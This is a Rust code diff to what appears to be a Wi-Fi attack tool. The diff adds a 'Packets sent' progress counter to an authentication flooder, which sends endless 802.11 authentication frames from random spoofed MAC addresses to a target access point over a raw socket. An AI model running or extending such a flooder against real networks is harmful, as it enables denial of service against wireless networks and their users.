@@ -6,7 +6,7 @@ use crate::iface::InterfaceManager;
 use crate::pkt_builder::PacketBuilder;
 use crate::sniffer::PacketSniffer;
 use crate::sockets::Layer2RawSocket;
-use crate::utils::abort;
+use crate::utils::{abort, inline_display};
 
 
 
@@ -79,12 +79,21 @@ impl AuthenticationFlooder {
     fn send_endlessly(&self, bssid: [u8; 6]) {
         let mut rand    = RandValues::new();
         let mut builder = PacketBuilder::new();
-        let socket      = Layer2RawSocket::new(&self.iface); 
-
+        let socket      = Layer2RawSocket::new(&self.iface);
+        
+        let mut sent: usize = 0;
         loop {
             let pkt = builder.auth_802_11(rand.get_random_mac(), bssid);
             socket.send(pkt);
+            sent += 1;
+            Self::display_progress(sent);
         }
+    }
+
+
+    fn display_progress(sent: usize) {
+        let msg: String = format!("Packets sent: {}", &sent);
+        inline_display(msg);
     }
 
 }
